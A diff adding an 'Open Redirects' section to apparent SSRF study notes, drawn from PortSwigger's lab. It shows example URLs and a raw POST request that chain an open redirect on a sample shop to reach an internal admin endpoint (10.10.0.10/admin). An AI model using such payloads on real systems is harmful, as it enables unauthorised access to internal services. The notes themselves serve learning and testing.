@@ -146,3 +146,34 @@ stockApi=http://localhost/admin
 `https://localhost#expected-host`
 
 ## Open Redirects
+
++ If the web application contains an open redirect vulnerability it maybe be possible to leverage it to develop a SSRF exploit
++ An sufficent open redirect vulnrability would mean that even if the application is hardened against SSRF based vectors they can be negated by abusing the trust of the API 'host' that handels redirections
+
+### Approach
+
+
++ Consider a web application like an online shop which allows a user to cycle through products using a fully qualified URL to point to the next item but which also contains a redirection
+
+`http://weliketoshop.net/product/nextProduct?currentProductId=1&path=/product?productId=2`
+
++ In this case the path paramter is vulnerable to an open redirect vulnerability which allows the attack to specifiy an internal IP address as the value of the path paramter
+
+`http://weliketoshop.net/product/nextProduct?currentProductId=1&path=http://10.10.0.10/admin`
+
++ If an attacker submits this request with this modification the web application will make a trusted request to `10.10.0.10/admin` on behalf of the attacker
+
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://10.10.0.10/admin 
+```
+
+~ Credits to portswiggers SSRF lab for the sample web application ~
+
+# Resources
+
++ [Portswigger SSRF Labs](https://portswigger.net/web-security/ssrf)
++ [DZ Zone Open redirects](https://dzone.com/articles/what-is-an-open-redirection-vulnerability-and-how)
